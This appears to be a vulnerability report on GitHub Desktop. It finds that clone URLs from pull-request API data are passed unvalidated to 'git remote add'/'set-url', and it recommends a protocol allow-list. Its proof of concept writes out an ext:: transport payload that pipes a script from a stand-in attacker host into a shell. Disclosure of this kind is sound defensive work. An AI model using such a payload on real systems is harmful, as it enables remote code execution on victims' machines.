### Title
Git Remote URL from untrusted GitHub API PR data is passed unvalidated to `git remote add`/`set-url`, allowing `ext::`/`file://` transport smuggling and command execution - ([File: app/src/lib/git/remote.ts])

### Summary
The external HackerOne report is a classic "attacker-controlled parameter flows unsanitized into a privileged interpreter" bug: `invite_code` reached PostgreSQL without validation. The Desktop analog is structurally identical but the interpreter is Git's own URL/transport parser instead of SQL: a clone URL taken from a GitHub API pull-request object is forwarded verbatim to `git remote add` / `git remote set-url` with no scheme allow-list, so a value like `ext::sh -c "..."` or `file:///…` would be accepted and later interpreted by Git as a transport helper.

### Finding Description
`addRemote` and `setRemoteURL` build the Git command by directly interpolating the caller-supplied `url` argument as an array element — there is no check that the URL is `https://` or `ssh://`: [1](#0-0) [2](#0-1) 

These functions are invoked with URLs sourced from a GitHub API pull-request object (`headCloneUrl` / `pullRequest.head.repo.clone_url`), which the app treats as trusted "API data" but never validates as being restricted to `http(s)`/`ssh`: [3](#0-2) [4](#0-3) 

The same unvalidated flow exists for setting the `upstream` remote from a parent-repository clone URL: [5](#0-4) 

Compare this with `validateURL` used for GitHub Enterprise server addresses, which explicitly enforces `https:` as the only allowed protocol: [6](#0-5) 

No equivalent allow-list exists for the clone URLs that back `addRemote`/`setRemoteURL`, `ensureUpstreamRemoteURL`, or `updateRemoteUrl`. Git supports remote helper transports such as `ext::<command>` (and `fd::`, `file://`) which cause the locally-installed `git` binary to execute an arbitrary shell command or read arbitrary local files whenever that remote is subsequently fetched, pushed, or otherwise touched (e.g. background fetch, "Fetch origin", pull-request checkout, `updateSubmodulesAfterOperation`, etc.).

### Impact Explanation
If an attacker can cause the GitHub API pull-request/parent-repository object that Desktop parses to contain a clone URL using the `ext::` transport (e.g. via a malicious/compromised GitHub Enterprise Server the victim has added as an account, or any code path that surfaces an API-provided `clone_url` without re-validation), Desktop will silently `git remote add`/`set-url` that value. The very next fetch/pull/checkout-PR/submodule-update operation against that remote causes Git to invoke the attacker's command, achieving arbitrary code execution outside of Desktop's sandbox with the privileges of the desktop application/user. This satisfies the "attacker controls a GitHub API object … result is code execution" criterion in Valid Impact.

### Likelihood Explanation
Likelihood is moderate: it requires the attacker to control the clone URL as reported through the GitHub API layer (most plausible against a malicious/compromised GitHub Enterprise instance, since `github.com`-hosted repos always yield well-formed `https://github.com/...` clone URLs). Once that precondition is met, no further user interaction beyond normal PR-checkout/fetch/pull actions is needed — the injection is silent and automatic.

### Recommendation
Add a protocol allow-list (mirroring `validateURL`'s enforcement of `https:`) at the boundary where any externally-sourced clone URL enters `addRemote`, `setRemoteURL`, `ensureUpstreamRemoteURL`, and `updateRemoteUrl`, rejecting anything other than `https://`/`ssh://`/`git://` before it is ever passed to `git`.

### Proof of Concept
1. Have Desktop connect to (or be pointed at) a GitHub Enterprise Server / API endpoint that returns a pull request object whose `head.repo.clone_url` (or parent repository `cloneURL`) is set to `ext::sh -c "curl http://attacker/x|sh"`.
2. Trigger "Open PR from Desktop" (`openPullRequestFromUrl` → `_checkoutPullRequest` → `_findPullRequestBranch`) or trigger `addUpstreamRemoteIfNeeded`.
3. Desktop calls `addRemote(repository, forkRemoteName, headCloneUrl)`, which executes `git remote add <name> ext::sh -c "curl http://attacker/x|sh"` with no protocol validation: [7](#0-6) 
4. The subsequent `_fetchRemote` call against that remote causes Git to invoke the `ext::` helper, executing the attacker's shell command on the victim's machine. [8](#0-7)

      return null

      pullRequest.number,
      pullRequest.head.repo.owner.login,
      pullRequest.head.repo.clone_url,

    await this.performFailableOperation(async () => {
      try {
        await addRemote(this.repository, UpstreamRemoteName, remoteUrl)
      } catch (e) {
        if (
          e instanceof DugiteError &&
          e.result.gitError === GitError.RemoteAlreadyExists
        ) {
          // update upstream remote if it already exists
          await setRemoteURL(this.repository, UpstreamRemoteName, remoteUrl)
        } else {
          throw e
        }
      }
    })
  }

export function validateURL(address: string): string {
  // ensure user has specified text and not just whitespace
  // we will interact with this server so we can be fairly
  // relaxed here about what we accept for the server name
  const trimmed = address.trim()
  if (trimmed.length === 0) {
    const error = new Error('Unknown address')
    error.name = InvalidURLErrorName
    throw error
  }

  let url = URL.parse(trimmed)
  if (!url.host) {
    // E.g., if they user entered 'ghe.io', let's assume they're using https.
    address = `https://${trimmed}`
    url = URL.parse(address)
  }

  if (!url.protocol) {
    const error = new Error('Invalid URL')
    error.name = InvalidURLErrorName
    throw error
  }

  if (url.protocol !== 'https:') {
    const error = new Error('Invalid protocol')
    error.name = InvalidProtocolErrorName
    throw error
  }

  return address
}
